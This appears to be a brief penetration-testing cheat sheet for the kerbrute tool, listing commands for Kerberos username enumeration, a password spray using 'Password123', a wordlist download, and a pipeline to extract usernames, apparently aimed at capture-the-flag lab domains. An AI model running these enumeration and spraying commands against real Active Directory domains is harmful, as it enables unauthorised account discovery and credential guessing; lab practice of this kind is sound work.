## TOOL
```bash
# Source
https://github.com/ropnop/kerbrute

cp /home/kali/Arsenal/ActiveDirectory/kerbrute/kerbrute .

# Username List - Active Directory
wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/refs/heads/master/User.txt
```
## USERNAME BRUTEFORCE WITH USERNAME LIST
```bash
sudo ./kerbrute userenum ./User.txt --dc $ip -d raz0rblack.thm
sudo ./kerbrute userenum usernamelist --dc $ip -d vulnnet-rst.local
```
## PASSWORD SPRAY ON USERNAME LIST
```bash
sudo ./kerbrute passwordspray -d spookysec.local usernames.txt Password123 --dc $ip
```
## EXTRACT USERNAMES
```bash
cat raw-kerbrute | cut -d "@" -f 1 | cut -d " " -f 14 > users
```